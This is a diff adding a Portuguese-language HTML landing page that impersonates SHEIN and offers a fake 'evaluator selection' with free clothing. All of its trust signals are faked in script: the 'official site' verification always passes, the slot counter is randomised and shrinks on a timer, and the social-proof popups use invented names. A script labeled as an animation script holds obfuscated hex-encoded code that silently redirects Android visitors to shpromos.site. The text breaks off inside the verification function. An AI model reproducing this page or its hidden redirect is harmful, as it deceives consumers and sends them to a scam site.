@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-tap-highlight-color: transparent; scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #f0f0f0 0%, #e8e8e8 50%, #f0f0f0 100%);
+            min-height: 100vh;
+            color: #1a1a1a;
+            overflow-x: hidden;
+        }
+
+        /* Header - Sticky SEM blur (evita desfoque na logo) */
+        .header {
+            background: #ffffff;
+            padding: 12px 16px;
+            text-align: center;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 2px solid #22c55e;
+        }
+        .header-logo { height: 32px; image-rendering: -webkit-optimize-contrast; }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px 16px 100px;
+        }
+        
+        /* Date Banner */
+        .date-banner {
+            background: linear-gradient(145deg, #0f0f0f 0%, #1a1a1a 50%, #252525 100%);
+            border-radius: 20px;
+            padding: 24px 20px;
+            margin-bottom: 16px;
+            text-align: center;
+            color: #ffffff;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.18), 0 2px 6px rgba(0,0,0,0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .date-banner::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, #22c55e, #4ade80, #22c55e);
+            background-size: 200% 100%;
+            animation: shimmerBar 2s ease infinite;
+        }
+        .date-banner::after {
+            content: '';
+            position: absolute;
+            top: -50%; right: -30%;
+            width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(34,197,94,0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        @keyframes shimmerBar {
+            0%, 100% { background-position: 0% 0; }
+            50% { background-position: 100% 0; }
+        }
+        .date-icon { font-size: 30px; margin-bottom: 10px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
+        .date-label {
+            font-size: 10px;
+            font-weight: 800;
+            color: #4ade80;
+            text-transform: uppercase;
+            letter-spacing: 2.5px;
+            margin-bottom: 6px;
+        }
+        .date-value {
+            font-size: 22px;
+            font-weight: 900;
+            color: #ffffff;
+            margin-bottom: 12px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        .date-warning {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #fca5a5;
+            padding: 8px 16px;
+            border-radius: 22px;
+            font-size: 12px;
+            font-weight: 700;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            animation: pulseWarning 2s ease-in-out infinite;
+        }
+        @keyframes pulseWarning {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.02); }
+        }
+        
+        /* Selection Card */
+        .selection-card {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 30px 22px;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.07), 0 1px 3px rgba(0,0,0,0.05);
+            border: 1px solid #f0f0f0;
+            position: relative;
+            overflow: hidden;
+        }
+        .selection-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 100px;
+            background: linear-gradient(180deg, rgba(34,197,94,0.04) 0%, transparent 100%);
+            pointer-events: none;
+        }
+        .selection-header { text-align: center; margin-bottom: 22px; position: relative; }
+        .selection-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+            color: #92400e;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 8px 18px;
+            border-radius: 30px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 14px rgba(253, 230, 138, 0.4);
+            letter-spacing: 1px;
+            animation: badgePulse 3s ease-in-out infinite;
+        }
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 4px 14px rgba(253, 230, 138, 0.4); }
+            50% { box-shadow: 0 4px 20px rgba(253, 230, 138, 0.7); }
+        }
+        .selection-title {
+            font-size: 21px;
+            font-weight: 900;
+            color: #0f0f0f;
+            margin-bottom: 10px;
+            line-height: 1.3;
+            letter-spacing: -0.3px;
+        }
+        .selection-subtitle {
+            font-size: 13px;
+            color: #777;
+            line-height: 1.65;
+        }
+        
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 24px 0;
+        }
+        .stat-item {
+            text-align: center;
+            padding: 18px 8px 14px;
+            background: #fafafa;
+            border-radius: 16px;
+            border: 1.5px solid #eee;
+            transition: all 0.25s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .stat-item.urgent {
+            background: linear-gradient(135deg, #fff5f5, #fef2f2);
+            border: 2px solid #ef4444;
+            animation: pulse-border 2s infinite;
+            position: relative;
+        }
+        .stat-item.urgent::after {
+            content: '🔥 ESGOTANDO';
+            position: absolute;
+            top: -10px; left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            font-size: 8px;
+            font-weight: 800;
+            padding: 3px 10px;
+            border-radius: 10px;
+            white-space: nowrap;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 8px rgba(239,68,68,0.3);
+        }
+        @keyframes pulse-border {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(239,68,68,0.4); }
+            50% { box-shadow: 0 0 16px 4px rgba(239,68,68,0.2); }
+        }
+        .stat-number {
+            font-size: 22px;
+            font-weight: 900;
+            color: #16a34a;
+            margin-bottom: 4px;
+        }
+        .stat-number.urgent {
+            color: #ef4444;
+            font-size: 28px;
+        }
+        .stat-label {
+            font-size: 9px;
+            font-weight: 700;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Criteria */
+        .criteria-container {
+            background: linear-gradient(180deg, #f8faf8 0%, #f3f4f3 100%);
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 24px;
+            border: 1px solid #e8ece8;
+        }
+        .criteria-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .criteria-list { list-style: none; }
+        .criteria-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 0;
+            font-size: 13px;
+            color: #555;
+            font-weight: 500;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .criteria-item:last-child { border-bottom: none; }
+        .criteria-icon {
+            width: 24px;
+            height: 24px;
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #ffffff;
+            flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(34,197,94,0.25);
+        }
+        
+        /* Progress Section */
+        .index-progress-section {
+            background: #ffffff;
+            border: 1px solid #f0f0f0;
+            border-radius: 20px;
+            padding: 22px;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.07), 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 14px;
+        }
+        .progress-title { 
+            font-size: 13px; 
+            font-weight: 700; 
+            color: #1a1a1a; 
+            display: block;
+            margin-bottom: 3px;
+        }
+        .progress-subtitle {
+            font-size: 11px;
+            color: #888;
+        }
+        .progress-count { 
+            font-size: 12px; 
+            font-weight: 800; 
+            color: #ef4444; 
+            background: #fef2f2;
+            padding: 5px 12px;
+            border-radius: 8px;
+            white-space: nowrap;
+        }
+        .progress-bar {
+            height: 10px;
+            background: #f1f5f9;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.04);
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ef4444 0%, #f97316 100%);
+            border-radius: 10px;
+            transition: width 1s cubic-bezier(0.22, 1, 0.36, 1), background 1s ease;
+            position: relative;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);
+            background-size: 16px 16px;
+            animation: move-stripes 0.8s linear infinite;
+        }
+        @keyframes move-stripes {
+            0% { background-position: 0 0; }
+            100% { background-position: 16px 0; }
+        }
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #999;
+        }
+        
+        /* CTA Button - Fixed bottom */
+        .cta-wrapper {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 14px 16px;
+            padding-bottom: calc(14px + env(safe-area-inset-bottom, 0px));
+            background: #ffffff;
+            z-index: 90;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+        }
+        .cta-btn {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 18px;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
+            color: #fff;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.25);
+            position: relative;
+            overflow: hidden;
+            font-family: inherit;
+        }
+        .cta-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%; width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent);
+            animation: ctaShine 2.5s ease-in-out infinite;
+        }
+        @keyframes ctaShine {
+            0%, 100% { left: -100%; }
+            50% { left: 150%; }
+        }
+        .cta-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        .cta-btn span {
+            background: #22c55e;
+            color: #fff;
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            transition: transform 0.3s ease;
+            box-shadow: 0 2px 8px rgba(34,197,94,0.3);
+        }
+        .cta-btn:active span { transform: translateX(3px); }
+        
+        /* Social Proof Popup - Canto inferior esquerdo */
+        .social-popup {
+            position: fixed;
+            bottom: 90px;
+            left: 12px;
+            max-width: 300px;
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 12px 14px;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.14);
+            transform: translateX(-120%);
+            opacity: 0;
+            transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.3s ease;
+            z-index: 95;
+            border-left: 3px solid #22c55e;
+        }
+        .social-popup.show { transform: translateX(0); opacity: 1; }
+        .social-text { font-size: 12px; color: #555; line-height: 1.45; }
+        .social-text strong { color: #1a1a1a; }
+        .social-time { font-size: 10px; color: #bbb; margin-top: 4px; }
+        
+        /* Verification Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 28px 22px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            animation: modalIn 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        @keyframes modalIn {
+            0% { opacity: 0; transform: scale(0.92) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .modal-icon { font-size: 40px; margin-bottom: 14px; }
+        .modal-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 18px;
+        }
+        .verification-list { text-align: left; margin-bottom: 18px; }
+        .verification-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 18px;
+            margin-bottom: 10px;
+            background: #fff;
+            border-radius: 14px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            border: 1.5px solid #e5e7eb;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .verification-item.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .verification-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+        }
+        .verification-icon.checking { 
+            background: #f59e0b; 
+            color: #fff; 
+            animation: spin 0.8s linear infinite; 
+        }
+        .verification-icon.done { 
+            background: #22c55e; 
+            color: #fff; 
+            animation: pop 0.25s ease;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        @keyframes pop {
+            0% { transform: scale(0.7); }
+            60% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        .verification-text { font-size: 13px; color: #374151; font-weight: 500; }
+        
+        /* Success State */
+        .modal-success { display: none; }
+        .modal-success.show { display: block; }
+        .modal-checking { display: block; }
+        .modal-checking.hide { display: none; }
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 28px;
+            color: #fff;
+            animation: bounce 0.5s ease;
+            box-shadow: 0 6px 20px rgba(34,197,94,0.3);
+        }
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.12); }
+        }
+        .success-title {
+            font-size: 17px;
+            font-weight: 800;
+            color: #166534;
+            margin-bottom: 8px;
+        }
+        .success-text {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .continue-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 4px 16px rgba(34,197,94,0.3);
+            transition: all 0.25s ease;
+        }
+        .continue-btn:active { transform: scale(0.98); }
+        
+        .footer { text-align: center; padding: 20px 16px 10px; }
+        .footer-text { font-size: 11px; color: #bbb; }
+        
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #ffffff;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+        }
+        .loading-screen.hide {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .loading-logo {
+            height: 50px;
+            margin-bottom: 36px;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        .loading-spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid #eee;
+            border-top: 3px solid #1a1a1a;
+            border-radius: 50%;
+            margin-bottom: 24px;
+            animation: spin 0.7s linear infinite;
+        }
+        .loading-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            text-align: center;
+            max-width: 280px;
+            line-height: 1.5;
+        }
+        .loading-status {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+            padding: 10px 14px;
+            background: transparent;
+            border-radius: 10px;
+            opacity: 0;
+            transform: translateX(-16px);
+            transition: all 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+            width: 100%;
+            max-width: 300px;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .loading-status.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        .loading-status.success {
+            background: #f0fdf4;
+            border-bottom-color: #dcfce7;
+        }
+        .loading-status-icon { font-size: 15px; color: #bbb; }
+        .loading-status.success .loading-status-icon { color: #22c55e; }
+        .loading-status-text { font-size: 12px; color: #666; font-weight: 500; }
+        .loading-status.success .loading-status-text { color: #166534; font-weight: 700; }
+        
+        /* Main content hidden initially */
+        .main-content {
+            opacity: 0;
+            transition: opacity 0.6s ease;
+        }
+        .main-content.show { opacity: 1; }
+
+        /* Entrance animations */
+        .date-banner, .selection-card, .index-progress-section {
+            animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+        .date-banner { animation-delay: 0.05s; }
+        .selection-card { animation-delay: 0.15s; }
+        .index-progress-section { animation-delay: 0.3s; }
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Mobile tweaks */
+        @media screen and (max-width: 380px) {
+            .selection-title { font-size: 18px; }
+            .stat-number { font-size: 18px; }
+            .stat-number.urgent { font-size: 24px; }
+            .cta-btn { font-size: 14px; padding: 16px; }
+        }
+
+        /* Safe area */
+        @supports (padding-top: env(safe-area-inset-top)) {
+            .header { padding-top: calc(12px + env(safe-area-inset-top)); }
+        }
+    </style>
+
+
+</head>
+<body>
+    <!-- Loading Screen Inicial -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="images/sheinlogo.png" alt="SHEIN" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <p class="loading-text" id="loadingText">Verificando origem do acesso...</p>
+        
+        <div class="loading-status" id="loadingStatus1">
+            <span class="loading-status-icon">⏳</span>
+            <span class="loading-status-text">Verificando link de acesso...</span>
+        </div>
+        
+        <div class="loading-status" id="loadingStatus2">
+            <span class="loading-status-icon">⏳</span>
+            <span class="loading-status-text">Confirmando parceria com influenciadora...</span>
+        </div>
+        
+        <div class="loading-status" id="loadingStatus3">
+            <span class="loading-status-icon">⏳</span>
+            <span class="loading-status-text">Validando acesso ao site oficial...</span>
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+    <header class="header">
+        <img src="images/sheinlogo.png" alt="SHEIN Premiações" class="header-logo">
+    </header>
+
+    <div class="container">
+        <!-- Date Banner -->
+        <div class="date-banner">
+            <div class="date-icon">📅</div>
+            <p class="date-label">Último dia de inscrições</p>
+            <p class="date-value" id="dataAtual">Carregando...</p>
+            <p class="date-warning">⏰ Encerra hoje às 23:59</p>
+        </div>
+
+        <!-- Selection Card -->
+        <div class="selection-card">
+            <div class="selection-header">
+                <span class="selection-badge">✨ VAGAS LIMITADAS</span>
+                <h1 class="selection-title">Seleção de Avaliadoras 2026</h1>
+                <p class="selection-subtitle">Você foi pré-selecionada para participar do nosso programa oficial de testes e receber roupas gratuitas da marca em sua casa.</p>
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-number">750</div>
+                    <div class="stat-label">Vagas totais</div>
+                </div>
+                <div class="stat-item urgent">
+                    <div class="stat-number urgent" id="vagasRestantes">...</div>
+                    <div class="stat-label">Vagas restantes</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">R$2.500</div>
+                    <div class="stat-label">Em prêmios</div>
+                </div>
+            </div>
+            
+            <div class="criteria-container">
+                <h3 class="criteria-title">📋 Critérios de aprovação:</h3>
+                <ul class="criteria-list">
+                    <li class="criteria-item"><span class="criteria-icon">✓</span> Ser maior de 18 anos e residir no Brasil</li>
+                    <li class="criteria-item"><span class="criteria-icon">✓</span> Concluir a pesquisa de perfil inicial</li>
+                    <li class="criteria-item"><span class="criteria-icon">✓</span> Comprometer-se a tirar fotos dos looks recebidos</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Progress -->
+        <div class="index-progress-section">
+            <div class="progress-header">
+                <div>
+                    <span class="progress-title">Andamento da seleção</span>
+                    <span class="progress-subtitle" id="participantes">... inscrições confirmadas</span>
+                </div>
+                <span class="progress-count">Faltam <span id="vagasRestantes2">...</span></span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-info">
+                <span id="porcentagemTexto">... preenchido</span>
+                <span>Meta: 750</span>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="cta-wrapper">
+        <button class="cta-btn" onclick="iniciarVerificacao()">
+            QUERO PARTICIPAR AGORA <span>→</span>
+        </button>
+    </div>
+
+    <!-- Social Proof Popup -->
+    <div class="social-popup" id="socialPopup">
+        <p class="social-text" id="socialText">✅ Juliana passou no teste de avaliadora</p>
+        <p class="social-time" id="socialTime">agora mesmo</p>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <div class="modal-checking" id="modalChecking">
+                <div class="modal-icon">🔍</div>
+                <h2 class="modal-title">Verificando elegibilidade...</h2>
+                <div class="verification-list" id="verificationList">
+                    <!-- Items serão adicionados dinamicamente -->
+                </div>
+            </div>
+            <div class="modal-success" id="modalSuccess">
+                <div class="success-icon">✓</div>
+                <h2 class="success-title">Perfil Pré-Aprovado!</h2>
+                <p class="success-text">Seu perfil foi pré-aprovado para a seleção de avaliadoras SHEIN 2026. Clique em continuar para prosseguir com o questionário.</p>
+                <button class="continue-btn" onclick="prosseguir()">CONTINUAR →</button>
+            </div>
+        </div>
+    </div>
+
+    </div> <!-- fecha main-content -->
+
+    
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+<footer class="footer">
+        <p class="footer-text">SHEIN Brasil © 2026 • Todos os direitos reservados</p>
+    </footer>
+
+    <script>
+        // === LOADING SCREEN INICIAL ===
+        function iniciarLoadingScreen() {
+            const status1 = document.getElementById('loadingStatus1');
+            const status2 = document.getElementById('loadingStatus2');
+            const status3 = document.getElementById('loadingStatus3');
+            const loadingText = document.getElementById('loadingText');
+            
+            // Etapa 1 - Verificando link (após 800ms)
+            setTimeout(() => {
+                status1.classList.add('show');
+            }, 800);
+            
+            // Etapa 1 concluída (após 2s)
+            setTimeout(() => {
+                status1.classList.add('success');
+                status1.querySelector('.loading-status-icon').textContent = '✅';
+                status1.querySelector('.loading-status-text').textContent = 'Link de acesso válido';
+            }, 2000);
+            
+            // Etapa 2 - Verificando influenciadora (após 2.5s)
+            setTimeout(() => {
+                status2.classList.add('show');
+            }, 2500);
+            
+            // Etapa 2 concluída (após 6s)
+            setTimeout(() => {
+                status2.classList.add('success');
+                status2.querySelector('.loading-status-icon').textContent = '✅';
+                
+                // Pega o nome do influenciador da URL se existir
+                const urlParams = new URLSearchParams(window.location.search);
+                const influenciador = urlParams.get('inf') || urlParams.get('utm_source') || urlParams.get('src') || '';
+                
+                if (influenciador) {
+                    // Adiciona o @ se não tiver e formata
+                    let nomeFormatado = influenciador.startsWith('@') ? influenciador : '@' + influenciador;
+                    // Previne injeção de HTML básica
+                    nomeFormatado = nomeFormatado.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                    
+                    status2.querySelector('.loading-status-text').innerHTML = `Acesso liberado pela influenciadora <strong style="color: #22c55e;">${nomeFormatado}</strong>!`;
+                } else {
+                    status2.querySelector('.loading-status-text').innerHTML = 'Parceria com influenciadora <strong>confirmada!</strong>';
+                }
+            }, 6000);
+            
+            // Etapa 3 - Validando site oficial (após 7s)
+            setTimeout(() => {
+                status3.classList.add('show');
+            }, 7000);
+            
+            // Etapa 3 concluída (após 10s)
+            setTimeout(() => {
+                status3.classList.add('success');
+                status3.querySelector('.loading-status-icon').textContent = '✅';
+                status3.querySelector('.loading-status-text').textContent = 'Site oficial da promoção validado';
+                loadingText.innerHTML = '<strong style="color: #22c55e;">✓ Acesso autorizado!</strong><br><span style="font-size: 12px; color: #666;">Você está no site oficial da promoção SHEIN</span>';
+            }, 10000);
+            
+            // Esconde loading e mostra conteúdo (após 12s)
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.add('hide');
+                document.getElementById('mainContent').classList.add('show');
+            }, 12000);
+        }
+        
+        // Inicia loading ao carregar página
+        document.addEventListener('DOMContentLoaded', iniciarLoadingScreen);
+        
+        // Data atual
+        const meses = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
+        const hoje = new Date();
+        document.getElementById('dataAtual').textContent = `${hoje.getDate()} de ${meses[hoje.getMonth()]} de ${hoje.getFullYear()}`;
+        
+        // === VAGAS - TOTAL 750 ===
+        const TOTAL_VAGAS = 750;
+        let vagasRestantes = Math.floor(Math.random() * 8) + 8; // Inicia entre 8-15
+        
+        function atualizarVagas() {
+            document.getElementById('vagasRestantes').textContent = vagasRestantes;
+            document.getElementById('vagasRestantes2').textContent = vagasRestantes;
+            const preenchidas = TOTAL_VAGAS - vagasRestantes;
+            document.getElementById('participantes').textContent = preenchidas + ' inscrições confirmadas';
+            
+            const porcentagem = ((preenchidas / TOTAL_VAGAS) * 100);
+            document.getElementById('progressFill').style.width = porcentagem + '%';
+            document.getElementById('porcentagemTexto').textContent = porcentagem.toFixed(1).replace('.0', '') + '% preenchido';
+            
+            const progressFill = document.getElementById('progressFill');
+            if (vagasRestantes <= 4) {
+                progressFill.style.background = 'linear-gradient(90deg, #dc2626 0%, #991b1b 100%)';
+            } else if (vagasRestantes <= 8) {
+                progressFill.style.background = 'linear-gradient(90deg, #f97316 0%, #ef4444 100%)';
+            } else {
+                progressFill.style.background = 'linear-gradient(90deg, #fbbf24 0%, #f97316 100%)';
+            }
+        }
+        atualizarVagas();
+
+        // Diminui 1 vaga por vez, intervalo 12-20s, para em 3
+        function diminuirVaga() {
+            if (vagasRestantes > 3) {
+                vagasRestantes--;
+                atualizarVagas();
+            }
+            const proximo = Math.floor(Math.random() * 8000) + 12000; // 12s a 20s
+            setTimeout(diminuirVaga, proximo);
+        }
+        setTimeout(diminuirVaga, Math.floor(Math.random() * 5000) + 10000);
+        
+        // === SOCIAL PROOF POPUPS - Canto inferior esquerdo ===
+        const nomes = [
+            'Juliana M.', 'Ana C.', 'Fernanda L.', 'Bruna S.', 'Camila O.',
+            'Larissa C.', 'Amanda S.', 'Beatriz A.', 'Carolina M.', 'Daniela F.',
+            'Gabriela R.', 'Isabela M.', 'Letícia R.', 'Mariana G.', 'Natália C.',
+            'Patrícia B.', 'Rafaela D.', 'Sabrina A.', 'Tatiane M.', 'Vanessa P.'
+        ];
+        const cidades = ['SP', 'RJ', 'MG', 'BA', 'PR', 'RS', 'SC', 'PE', 'CE', 'GO', 'DF', 'PA', 'MA', 'ES'];
+        const mensagens = [
+            (n, c) => `✅ <strong>${n}</strong> de ${c} acabou de se inscrever`,
+            (n, c) => `🎉 <strong>${n}</strong> de ${c} garantiu sua vaga`,
+            (n, c) => `👗 <strong>${n}</strong> de ${c} foi aprovada no quiz`,
+            (n) => `⚡ Restam apenas <strong>${vagasRestantes} vagas</strong>`,
+            (n, c) => `🔥 <strong>${n}</strong> de ${c} concluiu a avaliação`,
+            (n, c) => `📦 <strong>${n}</strong> de ${c} vai receber o kit SHEIN`
+        ];
+        const tempos = ['agora mesmo', 'há 1 min', 'há 2 min', 'há poucos segundos'];
+        
+        let popupTimer = null;
+        function mostrarPopup() {
+            const popup = document.getElementById('socialPopup');
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            const cidade = cidades[Math.floor(Math.random() * cidades.length)];
+            const msgFn = mensagens[Math.floor(Math.random() * mensagens.length)];
+            const tempo = tempos[Math.floor(Math.random() * tempos.length)];
+            
+            document.getElementById('socialText').innerHTML = msgFn(nome, cidade);
+            document.getElementById('socialTime').textContent = tempo;
+            
+            popup.classList.add('show');
+            
+            // Some após 4s, próximo após 8-14s
+            setTimeout(() => {
+                popup.classList.remove('show');
+                popupTimer = setTimeout(mostrarPopup, Math.floor(Math.random() * 6000) + 8000);
+            }, 4000);
+        }
+        
+        // Primeiro popup após 6s
+        popupTimer = setTimeout(mostrarPopup, 6000);
+        
+        // Verificação animada
+        function iniciarVerificacao() {
+            document.getElementById('modalOverlay').classList.add('show');
+            const container = document.getElementById('verificationList');
